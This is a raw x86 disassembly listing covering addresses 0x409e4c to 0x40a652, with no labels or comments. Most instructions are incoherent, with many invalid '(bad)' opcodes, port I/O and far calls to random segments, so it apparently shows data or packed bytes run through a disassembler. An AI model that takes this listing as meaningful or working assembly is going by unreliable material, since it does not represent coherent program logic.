  409e4c:	pop    ecx
  409e4d:	xchg   ebp,eax
  409e4e:	sbb    BYTE PTR [edx+ecx*4+0x54d24444],bh
  409e55:	mov    BYTE PTR ds:0x36381242,ah
  409e5b:	sub    dh,BYTE PTR [eax]
  409e5d:	add    eax,0xf22bdf6c
  409e62:	sub    esp,DWORD PTR [edx+eiz*8]
  409e65:	(bad)  
  409e66:	popa   
  409e67:	push   ebp
  409e68:	aaa    
  409e69:	mov    dl,0xe6
  409e6b:	mov    ch,0x55
  409e6d:	cmp    eax,0x88e24533
  409e72:	inc    ebp
  409e73:	loopne 0x409edf
  409e75:	jae    0x409e05
  409e77:	push   esp
  409e78:	sbb    DWORD PTR [ebp-0x37ab8f9a],esi
  409e7e:	outs   dx,BYTE PTR ds:[esi]
  409e7f:	xlat   BYTE PTR ds:[ebx]
  409e80:	mov    edx,0x9b1a1f54
  409e85:	adc    BYTE PTR es:[ecx],0x80
  409e89:	imul   esp,DWORD PTR [ebx],0xffffffb2
  409e8c:	or     edx,ebp
  409e8e:	popa   
  409e8f:	or     DWORD PTR cs:[eax],0x4d
  409e93:	pop    esp
  409e94:	sti    
  409e95:	mov    ch,dl
  409e97:	or     BYTE PTR [edi+0x1aa68ffe],dh
  409e9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e9e:	in     al,dx
  409e9f:	jl     0x409e5a
  409ea1:	cmp    al,0x47
  409ea3:	mov    ds:0xdde5931,al
  409ea8:	nop
  409ea9:	stc    
  409eaa:	and    DWORD PTR [edx],edx
  409eac:	xor    al,0x46
  409eae:	add    eax,0xa06596a3
  409eb3:	lea    ecx,[ecx-0x2f]
  409eb6:	add    ch,ch
  409eb8:	ins    BYTE PTR es:[edi],dx
  409eb9:	dec    ebp
  409eba:	adc    eax,DWORD PTR [edi-0x1d1e8a75]
  409ec0:	sub    BYTE PTR [edx],0xad
  409ec3:	scas   al,BYTE PTR es:[edi]
  409ec4:	cmp    ch,BYTE PTR [ebx-0x29bf4ff]
  409eca:	pop    ebx
  409ecb:	pop    edi
  409ecc:	jge    0x409ed1
  409ece:	aaa    
  409ecf:	fld    QWORD PTR [ecx-0x248a1ea5]
  409ed5:	enter  0x4538,0x17
  409ed9:	cmp    ebp,DWORD PTR [esi]
  409edb:	fldcw  WORD PTR [edi+0x5a]
  409ede:	pop    ebx
  409edf:	in     al,dx
  409ee0:	inc    esp
  409ee1:	mov    bl,0xdf
  409ee3:	icebp  
  409ee4:	clc    
  409ee5:	push   ecx
  409ee6:	mov    ch,0xa
  409ee8:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  409eea:	jge    0x409ec1
  409eec:	dec    eax
  409eed:	enter  0x8e6f,0x9a
  409ef1:	outs   dx,BYTE PTR ds:[esi]
  409ef2:	xor    ecx,esp
  409ef4:	in     al,0x84
  409ef6:	js     0x409f43
  409ef8:	jl     0x409f41
  409efa:	imul   edx,DWORD PTR [esp+ebx*2+0x20e86c17],0xaedf9f0b
  409f05:	and    al,BYTE PTR [esi-0x17]
  409f08:	push   ecx
  409f09:	sbb    al,0xb5
  409f0b:	sbb    DWORD PTR [ebp+0x5bc88ddf],0x7d85a089
  409f15:	mov    ebx,0xacd846c7
  409f1a:	mov    bh,BYTE PTR [esi+0x4a5be807]
  409f20:	or     bl,BYTE PTR [ebx+0x3ba0b0c2]
  409f26:	sbb    BYTE PTR [esi],dh
  409f28:	mov    esi,0xc50b7275
  409f2d:	je     0x409ee8
  409f2f:	inc    esp
  409f30:	aaa    
  409f31:	mov    cl,0xc6
  409f33:	push   ss
  409f34:	inc    edi
  409f35:	xchg   ebx,eax
  409f36:	jbe    0x409f6a
  409f38:	aas    
  409f39:	lock fs ror ebp,cl
  409f3d:	dec    edx
  409f3e:	xor    dh,dl
  409f40:	xor    bl,BYTE PTR [esi+ebp*1+0x3]
  409f44:	call   0xa294:0x8e0e1647
  409f4b:	sar    DWORD PTR [esi],cl
  409f4d:	aad    0xab
  409f4f:	iret   
  409f50:	jge    0x409f9e
  409f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f53:	jl     0x409fa7
  409f55:	sbb    eax,0x7787dd78
  409f5a:	mov    ebp,0x52b81c51
  409f5f:	push   edx
  409f60:	aad    0x41
  409f62:	lock fbld TBYTE PTR [esi+0x1f4b7ac7]
  409f69:	jge    0x409f60
  409f6b:	push   ecx
  409f6c:	call   0x74355456
  409f71:	inc    edi
  409f72:	mov    bl,0xe7
  409f74:	lea    eax,[eax+0x15]
  409f77:	rcl    BYTE PTR ds:0x339d7618,0x82
  409f7e:	test   dh,dh
  409f80:	inc    edi
  409f81:	fcom   DWORD PTR [edx]
  409f83:	adc    eax,0x526cb150
  409f88:	mov    dl,BYTE PTR gs:[ecx]
  409f8b:	in     eax,dx
  409f8c:	ret    0x7d8b
  409f8f:	(bad)  
  409f90:	xchg   ebx,eax
  409f91:	cmp    ecx,DWORD PTR [edx+0x73b20695]
  409f97:	cli    
  409f98:	cwde   
  409f99:	retf   0xd868
  409f9c:	dec    ebx
  409f9d:	ja     0x409f53
  409f9f:	daa    
  409fa0:	xchg   ecx,eax
  409fa1:	xor    dl,BYTE PTR [esi-0x6e]
  409fa4:	pop    ebx
  409fa5:	stos   DWORD PTR es:[edi],eax
  409fa6:	imul   ebx,DWORD PTR [esi+eax*8-0x444d196e],0xfffffffc
  409fae:	sub    BYTE PTR [esi+esi*8],bh
  409fb1:	jecxz  0x409fcb
  409fb3:	cs ja  0x409fce
  409fb6:	loope  0x409f7a
  409fb8:	nop
  409fb9:	fistp  WORD PTR [ecx-0x5ab3295e]
  409fbf:	(bad)  
  409fc0:	(bad)  
  409fc1:	test   al,0xc5
  409fc3:	sub    dh,BYTE PTR [esi-0x6a9d4aa4]
  409fc9:	retf   
  409fca:	call   0x1525:0x6d74af23
  409fd1:	cmp    BYTE PTR [eax],ch
  409fd3:	add    al,0x44
  409fd5:	mov    edx,0xc100cb86
  409fda:	(bad)  
  409fdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fdc:	adc    dh,ch
  409fde:	cs je  0x409f70
  409fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fe2:	cwde   
  409fe3:	jo     0x409faf
  409fe5:	ds inc esp
  409fe7:	or     ah,BYTE PTR [esi]
  409fe9:	pop    edx
  409fea:	out    dx,eax
  409feb:	xchg   esi,eax
  409fec:	inc    ebx
  409fed:	out    0x90,eax
  409fef:	stos   BYTE PTR es:[edi],al
  409ff0:	jno    0x40a010
  409ff2:	mov    ds:0x7f3d592,eax
  409ff7:	lds    eax,FWORD PTR [edi]
  409ff9:	or     DWORD PTR [ecx],ebp
  409ffb:	retf   
  409ffc:	xor    eax,0x75a77151
  40a001:	div    dh
  40a003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a004:	jle    0x40a07c
  40a006:	cmp    eax,0x96a63562
  40a00b:	popa   
  40a00c:	jmp    0x409f9a
  40a00e:	inc    eax
  40a00f:	or     bh,BYTE PTR [ebx-0x1a]
  40a012:	idiv   dl
  40a014:	test   DWORD PTR [eax-0x6f4fa040],0x8f2abf86
  40a01e:	push   esp
  40a01f:	fistp  WORD PTR ds:0x25c5bf09
  40a025:	gs aam 0xbc
  40a028:	test   edx,ecx
  40a02a:	pop    esp
  40a02b:	sbb    esi,esp
  40a02d:	gs in  al,dx
  40a02f:	lods   al,BYTE PTR cs:[esi]
  40a031:	in     al,0xa
  40a033:	jo     0x409fdc
  40a035:	in     eax,dx
  40a036:	or     dh,BYTE PTR ss:[edi+0x19a04359]
  40a03d:	(bad)  
  40a03e:	repnz mov DWORD PTR [ebx+0x198caff6],edi
  40a045:	les    esi,FWORD PTR [edx+0x34694303]
  40a04b:	neg    DWORD PTR [edi]
  40a04d:	mov    dh,0x8e
  40a04f:	neg    BYTE PTR [eax+edx*8+0x54]
  40a053:	mov    ebx,0xc30999ae
  40a058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a059:	out    dx,al
  40a05a:	call   0x9027:0x37d39e6f
  40a061:	hlt    
  40a062:	and    eax,0xcdaded10
  40a067:	lock and esi,eax
  40a06a:	dec    edi
  40a06b:	das    
  40a06c:	push   eax
  40a06d:	mov    ah,0x1b
  40a06f:	mov    edi,0x82f6425f
  40a074:	jns    0x40a002
  40a076:	jmp    0xd0f0:0xc2e4d25c
  40a07d:	fst    st(1)
  40a07f:	ins    DWORD PTR es:[edi],dx
  40a080:	repnz inc edi
  40a082:	sbb    DWORD PTR [edx],0xb1b245b2
  40a088:	dec    eax
  40a089:	push   edx
  40a08a:	cmp    eax,0x614f0140
  40a08f:	ror    BYTE PTR [eax-0x4a],0x61
  40a093:	and    eax,0x6c359ff1
  40a098:	or     ebx,ebx
  40a09a:	sub    al,0xcc
  40a09c:	loopne 0x40a08d
  40a09e:	int3   
  40a09f:	cmp    bh,BYTE PTR [edx-0x7d92cfdc]
  40a0a5:	xchg   esi,eax
  40a0a6:	fild   QWORD PTR [ebp+0x5681a304]
  40a0ac:	and    ecx,edx
  40a0ae:	jmp    DWORD PTR [ecx+0x7a630f4f]
  40a0b4:	fucomp st(1)
  40a0b6:	cmc    
  40a0b7:	pop    ecx
  40a0b8:	cmp    eax,0xbe828631
  40a0bd:	addr16 pop ebx
  40a0bf:	xchg   esp,eax
  40a0c0:	push   0x50
  40a0c2:	add    eax,0x497b8213
  40a0c7:	pop    ebp
  40a0c8:	int    0x12
  40a0ca:	dec    ebx
  40a0cb:	adc    edi,DWORD PTR [eax-0x7bbebbfc]
  40a0d1:	fcmovnb st,st(2)
  40a0d3:	std    
  40a0d4:	test   al,0xbe
  40a0d6:	rcr    DWORD PTR [eax-0x1b575c54],cl
  40a0dc:	pusha  
  40a0dd:	cmp    DWORD PTR [edi-0xf],eax
  40a0e0:	mov    ecx,0x42064704
  40a0e5:	scas   al,BYTE PTR es:[edi]
  40a0e6:	mov    ch,0xe7
  40a0e8:	mov    ds:0x61d361b0,al
  40a0ed:	dec    edi
  40a0ee:	aam    0xbe
  40a0f0:	fdiv   QWORD PTR [eax+0x1d]
  40a0f3:	clc    
  40a0f4:	es cli 
  40a0f6:	mov    WORD PTR [ebx],es
  40a0f8:	adc    cl,BYTE PTR [eax]
  40a0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0fb:	and    al,0xe7
  40a0fd:	out    0xec,eax
  40a0ff:	pop    ecx
  40a100:	xchg   esp,eax
  40a101:	dec    ecx
  40a102:	(bad)  
  40a103:	and    BYTE PTR [ebx],bl
  40a105:	dec    ecx
  40a106:	or     esp,DWORD PTR [edx+edi*4]
  40a109:	or     eax,0xbc116db5
  40a10e:	out    0xd9,al
  40a110:	fdiv   QWORD PTR ds:0xbc1c11af
  40a116:	sbb    BYTE PTR [edi+eiz*8-0x73],dl
  40a11a:	int    0x43
  40a11c:	cmp    al,0x63
  40a11e:	mov    esp,0x4a225b74
  40a123:	sub    dh,BYTE PTR [edx-0x4e3d67d3]
  40a129:	div    BYTE PTR [ebp-0x6b]
  40a12c:	sti    
  40a12d:	sbb    al,0xee
  40a12f:	pop    ebx
  40a130:	jp     0x40a151
  40a132:	push   edi
  40a133:	stos   BYTE PTR es:[edi],al
  40a134:	aad    0x4e
  40a136:	adc    eax,0x75e01074
  40a13b:	aad    0xa0
  40a13d:	xchg   sp,ax
  40a13f:	out    dx,al
  40a140:	pushf  
  40a141:	test   eax,0x467b578a
  40a146:	call   0x54f7:0x94540f8d
  40a14d:	test   eax,0xb92a9c0a
  40a152:	ds in  al,dx
  40a154:	out    dx,eax
  40a155:	sub    eax,0x26c5b31a
  40a15a:	jle    0x40a0e8
  40a15c:	push   0x27eee52c
  40a161:	sbb    ebp,DWORD PTR [ebp-0x108671fe]
  40a167:	sbb    cl,BYTE PTR [eax]
  40a169:	pop    eax
  40a16a:	fwait
  40a16b:	daa    
  40a16c:	aam    0xf0
  40a16e:	lods   eax,DWORD PTR ds:[esi]
  40a16f:	inc    ecx
  40a170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a171:	ror    DWORD PTR [eax-0x5b8d88ac],1
  40a177:	jecxz  0x40a1da
  40a179:	pop    DWORD PTR [esi]
  40a17b:	and    al,0x4
  40a17d:	cmp    eax,0xf64a6509
  40a182:	dec    ebx
  40a183:	ss inc ebx
  40a185:	into   
  40a186:	rcl    bh,0x7d
  40a189:	in     eax,0x37
  40a18b:	mov    DWORD PTR ds:0x6b343530,edi
  40a191:	popf   
  40a192:	pusha  
  40a193:	or     DWORD PTR [edx+0x36],esp
  40a196:	adc    ecx,DWORD PTR [eax]
  40a198:	shl    BYTE PTR [edx-0x52],cl
  40a19b:	xor    edx,DWORD PTR [edi+0x5b]
  40a19e:	call   0xb9f772c5
  40a1a3:	adc    cl,0xbf
  40a1a6:	daa    
  40a1a7:	sbb    al,0xa
  40a1a9:	(bad)  
  40a1aa:	(bad)  
  40a1ab:	sbb    BYTE PTR [edi+0x2a504007],cl
  40a1b1:	aad    0xac
  40a1b3:	xor    bh,BYTE PTR [esi+ecx*4-0x41]
  40a1b7:	stc    
  40a1b8:	js     0x40a1fb
  40a1ba:	dec    edi
  40a1bb:	push   ebp
  40a1bc:	js     0x40a1f6
  40a1be:	fiadd  DWORD PTR [ebx]
  40a1c0:	fwait
  40a1c1:	dec    edi
  40a1c2:	jle    0x40a15f
  40a1c4:	es sahf 
  40a1c6:	dec    eax
  40a1c7:	xchg   BYTE PTR [eax-0x31],ah
  40a1ca:	(bad)  
  40a1cb:	int    0x5e
  40a1cd:	push   esi
  40a1ce:	sub    DWORD PTR [ebx+0x8],edi
  40a1d1:	out    dx,al
  40a1d2:	ret    0x317d
  40a1d5:	sbb    BYTE PTR [eax+0x6689937b],dl
  40a1db:	outs   dx,DWORD PTR ds:[esi]
  40a1dc:	cmp    dl,al
  40a1de:	les    esi,FWORD PTR [eax]
  40a1e0:	adc    DWORD PTR [ebx-0x725c1],0xffffffd4
  40a1e7:	dec    edx
  40a1e8:	hlt    
  40a1e9:	mov    al,0x67
  40a1eb:	int    0xd4
  40a1ed:	sahf   
  40a1ee:	pop    ebx
  40a1ef:	jns    0x40a172
  40a1f1:	jns    0x40a1a4
  40a1f3:	mov    dl,0x7f
  40a1f5:	mov    eax,ds:0xa00f841d
  40a1fa:	icebp  
  40a1fb:	(bad)  
  40a1fc:	or     al,0xf
  40a1fe:	jae    0x40a1b4
  40a200:	shl    DWORD PTR [edi],0x41
  40a203:	cmp    al,0xbd
  40a205:	cmc    
  40a206:	sbb    cl,BYTE PTR [ecx+eax*2+0xb797809]
  40a20d:	cmp    al,0x8b
  40a20f:	aam    0x16
  40a211:	cdq    
  40a212:	xchg   ah,dl
  40a214:	shl    DWORD PTR [eax+0x583bc2e7],cl
  40a21a:	mov    ds:0x78ac23fb,al
  40a21f:	imul   ebp,esi,0x4805da7f
  40a225:	dec    eax
  40a226:	scas   eax,DWORD PTR es:[edi]
  40a227:	or     eax,0xde78083f
  40a22c:	sbb    BYTE PTR [eiz*8+0xca2dca5],0xc8
  40a234:	fs out 0x57,al
  40a237:	pushw  es
  40a239:	dec    edi
  40a23a:	in     eax,0x62
  40a23c:	(bad)  
  40a23d:	outs   dx,BYTE PTR ds:[esi]
  40a23e:	add    eax,DWORD PTR [ecx+0x2d]
  40a241:	mov    dh,0xf7
  40a243:	sbb    dh,BYTE PTR [ecx+0x6]
  40a246:	sbb    ebx,0xffffffb8
  40a249:	push   es
  40a24a:	add    dh,dh
  40a24c:	shl    edx,cl
  40a24e:	imul   ecx,DWORD PTR [eax+0x33],0xffffffcc
  40a252:	fwait
  40a253:	mov    esi,0xba32065e
  40a258:	push   ss
  40a259:	push   DWORD PTR [ecx+eiz*2]
  40a25c:	xlat   BYTE PTR ds:[ebx]
  40a25d:	loop   0x40a239
  40a25f:	pop    esp
  40a260:	push   esi
  40a261:	mov    eax,ds:0x57b3d293
  40a266:	jae    0x40a25f
  40a268:	pop    ebp
  40a269:	mov    ah,0x7b
  40a26b:	jo     0x40a213
  40a26d:	fmul   DWORD PTR [edx-0x3f]
  40a270:	cld    
  40a271:	scas   al,BYTE PTR es:[edi]
  40a272:	xor    dl,BYTE PTR [edx-0x54]
  40a275:	add    eax,0x106afb3c
  40a27a:	pop    ds
  40a27b:	arpl   WORD PTR [ebx],di
  40a27d:	rcl    DWORD PTR [edx+0x36fb097],1
  40a283:	leave  
  40a284:	enter  0x77aa,0xe3
  40a288:	push   eax
  40a289:	cmp    BYTE PTR [esi+0x73f023f],bh
  40a28f:	ret    
  40a290:	pop    ecx
  40a291:	stc    
  40a292:	inc    ebp
  40a293:	loop   0x40a260
  40a295:	sbb    eax,0x8ef42a93
  40a29a:	inc    edx
  40a29b:	dec    edi
  40a29c:	fiadd  DWORD PTR [edx-0x5c]
  40a29f:	(bad)  
  40a2a1:	cwde   
  40a2a2:	mov    eax,DWORD PTR [edi+0x0]
  40a2a5:	adc    DWORD PTR [ebx],edi
  40a2a7:	jno    0x40a24c
  40a2a9:	iret   
  40a2aa:	ds daa 
  40a2ac:	cld    
  40a2ad:	mov    eax,0xe05f4cce
  40a2b2:	add    eax,0x8b0fdde1
  40a2b7:	jo     0x40a255
  40a2b9:	outs   dx,BYTE PTR ds:[esi]
  40a2ba:	adc    BYTE PTR [ebx+0x2b751aa3],al
  40a2c0:	dec    ebx
  40a2c1:	je     0x40a31c
  40a2c3:	sbb    cl,BYTE PTR [esi]
  40a2c5:	push   eax
  40a2c6:	sbb    DWORD PTR [ecx+0x0],0x30
  40a2ca:	xor    esp,DWORD PTR ss:[ebp+edx*4+0x7c]
  40a2cf:	shr    BYTE PTR [edi-0x39],1
  40a2d2:	cwde   
  40a2d3:	out    0xa9,al
  40a2d5:	or     al,0x8e
  40a2d7:	ja     0x40a358
  40a2d9:	mov    eax,0xa8dc0dfd
  40a2de:	loopne 0x40a32c
  40a2e0:	cdq    
  40a2e1:	xor    ebp,DWORD PTR [eax-0x546e2a0]
  40a2e7:	xor    al,0x34
  40a2e9:	(bad)  
  40a2ea:	adc    eax,0x17b28223
  40a2ef:	je     0x40a340
  40a2f1:	cwde   
  40a2f2:	mov    bl,0x2d
  40a2f4:	dec    esi
  40a2f5:	(bad)  
  40a2f7:	pop    eax
  40a2f8:	scas   al,BYTE PTR es:[edi]
  40a2f9:	pop    es
  40a2fa:	sub    esi,DWORD PTR [esi]
  40a2fc:	xchg   esp,eax
  40a2fd:	xchg   ebx,eax
  40a2fe:	scas   al,BYTE PTR es:[edi]
  40a2ff:	cmp    ebp,DWORD PTR [edx+0x5a951b40]
  40a305:	push   ebx
  40a306:	imul   BYTE PTR [edx+0x75]
  40a309:	sub    edx,DWORD PTR [edx+0x4a59d1ee]
  40a30f:	retf   
  40a310:	sub    BYTE PTR [eax],bl
  40a312:	or     DWORD PTR [edi+0x1a],0x752b09da
  40a319:	out    0x27,eax
  40a31b:	addr16 out 0x8,al
  40a31e:	out    0x1,eax
  40a320:	inc    esp
  40a321:	push   0x3a
  40a323:	jb     0x40a392
  40a325:	jge    0x40a2f4
  40a327:	or     BYTE PTR [ebx],bl
  40a329:	mov    ecx,0x50598346
  40a32e:	fild   WORD PTR [edx-0x56eb459e]
  40a334:	iret   
  40a335:	ins    BYTE PTR es:[edi],dx
  40a336:	call   0x2e51:0x9ae091aa
  40a33d:	mov    ds:0x7459e51c,al
  40a342:	mov    dl,0x52
  40a344:	jmp    0x1f75:0x63fd3056
  40a34b:	in     eax,0x11
  40a34d:	jp     0x40a3cb
  40a34f:	sub    eax,0xaf832d96
  40a354:	sbb    esp,DWORD PTR [edi]
  40a356:	ins    BYTE PTR es:[edi],dx
  40a357:	jp     0x40a377
  40a359:	nop
  40a35a:	clc    
  40a35b:	jnp    0x40a313
  40a35d:	sar    DWORD PTR [esi+edi*2+0x35686c3b],1
  40a364:	cmp    ebx,DWORD PTR [esi]
  40a366:	sbb    dl,BYTE PTR [eax+eax*2+0x0]
  40a36a:	xor    al,0xf7
  40a36c:	add    BYTE PTR [eax],cl
  40a36e:	pop    es
  40a36f:	sbb    DWORD PTR ds:0x7748136a,ebx
  40a375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a376:	stc    
  40a377:	jno    0x40a365
  40a379:	jmp    0x9af39818
  40a37e:	sub    al,0xf4
  40a380:	sbb    eax,0x3b4932d
  40a385:	xchg   edx,eax
  40a386:	jg     0x40a348
  40a388:	rol    BYTE PTR [ecx+0x2d],cl
  40a38b:	je     0x40a38e
  40a38d:	pusha  
  40a38e:	shr    DWORD PTR [ebx],0x96
  40a391:	sub    dh,ah
  40a393:	xchg   ebx,eax
  40a394:	adc    DWORD PTR [ebp+ebp*8+0x466e17f4],esi
  40a39b:	jp     0x40a38d
  40a39d:	pop    ebp
  40a39e:	nop
  40a39f:	imul   eax
  40a3a1:	mov    cl,0x22
  40a3a3:	stc    
  40a3a4:	sub    bh,BYTE PTR [ebx+ebx*8+0x44153525]
  40a3ab:	rcl    BYTE PTR [esi],1
  40a3ad:	scas   al,BYTE PTR es:[edi]
  40a3ae:	out    0x53,al
  40a3b0:	lock mov ah,0xfd
  40a3b3:	sbb    BYTE PTR [ebp+0x21],ch
  40a3b6:	lahf   
  40a3b7:	mov    edi,0xb03b6f05
  40a3bc:	and    eax,0x285f3941
  40a3c1:	ret    0x85fa
  40a3c4:	adc    BYTE PTR [ebp-0x1df022ea],ah
  40a3ca:	hlt    
  40a3cb:	int3   
  40a3cc:	dec    esi
  40a3cd:	jno    0x40a357
  40a3cf:	ret    0x5c7d
  40a3d2:	push   DWORD PTR [ebp-0xf]
  40a3d5:	dec    edi
  40a3d6:	fld    DWORD PTR [edx+eiz*8-0x6858161b]
  40a3dd:	(bad)  
  40a3de:	shl    ch,1
  40a3e0:	addr16 cs inc ecx
  40a3e3:	or     al,0x77
  40a3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3e6:	in     al,dx
  40a3e7:	iret   
  40a3e8:	xlat   BYTE PTR ds:[ebx]
  40a3e9:	into   
  40a3ea:	dec    ecx
  40a3eb:	(bad)
  40a3ef:	pop    ebp
  40a3f0:	in     eax,0x89
  40a3f2:	sti    
  40a3f3:	inc    edx
  40a3f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3f5:	add    eax,0xccb53f0d
  40a3fa:	test   BYTE PTR [ebx-0x2b],bh
  40a3fd:	mov    esp,0x34ba4250
  40a402:	xor    esi,DWORD PTR [edx]
  40a404:	mov    edx,0x72bc7391
  40a409:	inc    edi
  40a40a:	jo     0x40a38d
  40a40c:	lods   al,BYTE PTR ds:[esi]
  40a40d:	add    DWORD PTR [eax+eiz*4+0x2f543d25],esp
  40a414:	jmp    0x40a448
  40a416:	neg    DWORD PTR [edx]
  40a418:	in     al,0x86
  40a41a:	loope  0x40a439
  40a41c:	sbb    BYTE PTR [ecx-0x57],cl
  40a41f:	stos   DWORD PTR es:[edi],eax
  40a420:	inc    eax
  40a421:	dec    al
  40a423:	out    0x5,eax
  40a425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a426:	and    DWORD PTR [edx],esi
  40a428:	push   0xb3c1acca
  40a42d:	cli    
  40a42e:	pop    esp
  40a42f:	jnp    0x40a45d
  40a431:	sbb    eax,0x92baf653
  40a436:	stos   BYTE PTR es:[edi],al
  40a437:	inc    ecx
  40a438:	retf   0x6fee
  40a43b:	fcom   DWORD PTR [eax-0x47]
  40a43e:	fs fst st(0)
  40a441:	mov    eax,0xe68ae44c
  40a446:	jbe    0x40a3ed
  40a448:	xor    eax,0x5bd77d82
  40a44d:	lock aam 0x52
  40a450:	add    al,0x37
  40a452:	div    DWORD PTR [ebp+0x0]
  40a455:	loop   0x40a43a
  40a457:	(bad)  
  40a458:	stos   BYTE PTR es:[edi],al
  40a459:	cli    
  40a45a:	fimul  WORD PTR [ebx-0x72f557f7]
  40a460:	xchg   edi,eax
  40a461:	sbb    DWORD PTR [edi],ebp
  40a463:	cs jmp 0x5524:0x76a12cd5
  40a46b:	leave  
  40a46c:	jp     0x40a490
  40a46e:	xchg   ebp,eax
  40a46f:	or     al,0xbe
  40a471:	jns    0x40a495
  40a473:	outs   dx,DWORD PTR ds:[esi]
  40a474:	adc    eax,0x5054f8f3
  40a479:	cmp    edi,edx
  40a47b:	aas    
  40a47c:	retf   0x5afc
  40a47f:	ins    BYTE PTR es:[edi],dx
  40a480:	adc    eax,0xc5df0cda
  40a485:	(bad)  
  40a486:	adc    BYTE PTR [eax-0x12],al
  40a489:	test   DWORD PTR [ecx+esi*1],edi
  40a48c:	sbb    ah,dl
  40a48e:	inc    ebp
  40a48f:	retf   0x3fae
  40a492:	lods   eax,DWORD PTR ds:[esi]
  40a493:	adc    edx,DWORD PTR [edx]
  40a495:	cmp    cl,bl
	...
  40a513:	add    BYTE PTR ds:0x96f91681,dl
  40a519:	(bad)  
  40a51a:	(bad)  
  40a51b:	in     eax,dx
  40a51c:	push   eax
  40a51d:	scas   eax,DWORD PTR es:[edi]
  40a51e:	(bad)  
  40a51f:	jp     0x40a4e5
  40a521:	mov    cl,0x7
  40a523:	cdq    
  40a524:	push   ebx
  40a525:	push   edi
  40a526:	add    BYTE PTR [eax],al
  40a528:	imul   eax,DWORD PTR [edi],0x0
  40a52b:	add    ah,al
  40a52d:	mov    bl,0xc3
  40a52f:	inc    eax
  40a530:	lds    ebx,FWORD PTR [eax]
  40a532:	cmp    al,0xea
  40a534:	popf   
  40a535:	push   esi
  40a536:	xchg   ebx,eax
  40a537:	sub    esi,DWORD PTR [edx-0x38]
  40a53a:	inc    eax
  40a53b:	dec    eax
  40a53c:	xor    DWORD PTR [ecx-0x2ad3072b],0x44
  40a543:	add    esi,eax
  40a545:	hlt    
  40a546:	push   esp
  40a547:	fdivr  QWORD PTR [ebx-0x19]
  40a54a:	js     0x40a579
  40a54c:	add    BYTE PTR [ecx+0x47fe34b7],dh
  40a552:	cli    
  40a553:	mov    al,ds:0x1ea90aed
  40a558:	pop    es
  40a559:	loop   0x40a501
  40a55b:	add    al,0x7f
  40a55d:	adc    BYTE PTR [esi+0x554de54b],bl
  40a563:	int    0xf1
  40a565:	std    
  40a566:	push   cs
  40a567:	adc    eax,0x3d5eb8cd
  40a56c:	sti    
  40a56d:	scas   eax,DWORD PTR es:[edi]
  40a56e:	jle    0x40a55a
  40a570:	mov    dl,0x11
  40a572:	mov    edi,0x89ac2c0
  40a577:	nop
  40a578:	cmp    DWORD PTR [ebx],ebp
  40a57a:	nop
  40a57b:	pop    ecx
  40a57c:	push   esp
  40a57d:	jae    0x40a54a
  40a57f:	adc    al,BYTE PTR [ebx+0x61]
  40a582:	inc    ebp
  40a583:	or     cl,BYTE PTR [edx+0x3d776f44]
  40a589:	arpl   WORD PTR [eax+0x61],bx
  40a58c:	jns    0x40a53d
  40a58e:	sub    BYTE PTR [ecx],bh
  40a590:	inc    ebp
  40a591:	and    ecx,DWORD PTR es:[esi+edi*8+0x4ddbd089]
  40a599:	(bad)  
  40a59a:	adc    al,0x58
  40a59c:	adc    eax,0xdea11ee5
  40a5a1:	or     DWORD PTR ds:0x1b624e4d,0x7a
  40a5a8:	aas    
  40a5a9:	cdq    
  40a5aa:	icebp  
  40a5ab:	pop    edx
  40a5ac:	and    BYTE PTR [eax+0x48a65c11],bl
  40a5b2:	mov    edx,0x66258cf6
  40a5b7:	out    dx,eax
  40a5b8:	mov    ecx,0x89b4db8f
  40a5bd:	jecxz  0x40a581
  40a5bf:	bound  ecx,QWORD PTR [ebx+0x2b]
  40a5c2:	pop    edi
  40a5c3:	(bad)  
  40a5c4:	outs   dx,BYTE PTR ds:[esi]
  40a5c5:	outs   dx,DWORD PTR ds:[esi]
  40a5c6:	call   0x3996c793
  40a5cb:	lods   eax,DWORD PTR ds:[esi]
  40a5cc:	and    DWORD PTR [ebp+edi*1+0x147d50bb],edx
  40a5d3:	aas    
  40a5d4:	mov    eax,0x1e337267
  40a5d9:	adc    cl,ah
  40a5db:	test   DWORD PTR [ecx],ecx
  40a5dd:	mov    al,ds:0x48b9f804
  40a5e2:	pop    esp
  40a5e3:	clc    
  40a5e4:	adc    ecx,DWORD PTR [esi+0x6c29d4c5]
  40a5ea:	pop    ebp
  40a5eb:	mov    esi,0xc3d51717
  40a5f0:	les    esi,FWORD PTR [ebp+0x72]
  40a5f3:	gs js  0x40a664
  40a5f6:	pop    ebx
  40a5f7:	adc    edi,DWORD PTR [edx-0x34]
  40a5fa:	sbb    BYTE PTR [ecx+ebp*2+0x40bf626f],dl
  40a601:	mov    dl,0x37
  40a603:	into   
  40a604:	mov    bl,0xca
  40a606:	ror    ebx,cl
  40a608:	lahf   
  40a609:	adc    eax,0xbc1d503e
  40a60e:	stc    
  40a60f:	jmp    0xf660:0xcbc8274b
  40a616:	jo     0x40a5e2
  40a618:	mov    ch,ah
  40a61a:	nop
  40a61b:	sahf   
  40a61c:	dec    ebp
  40a61d:	aas    
  40a61e:	test   BYTE PTR [ebp*2+0x7a3ddacb],al
  40a625:	test   eax,0xf2b0f107
  40a62a:	fs push ecx
  40a62c:	push   cs
  40a62d:	call   0x62caadd2
  40a632:	xchg   edi,eax
  40a633:	xchg   esi,eax
  40a634:	mov    al,ds:0xe3dbc4ce
  40a639:	jle    0x40a6a6
  40a63b:	test   al,0xa9
  40a63d:	sub    BYTE PTR [edi+0x4fde1c9c],ah
  40a643:	jecxz  0x40a613
  40a645:	ss mov esi,0x60285233
  40a64b:	cdq    
  40a64c:	aas    
  40a64d:	dec    ebx
  40a64e:	jbe    0x40a6c7
  40a650:	in     eax,0xb4
  40a652:	ss and eax,0x8e5275e5
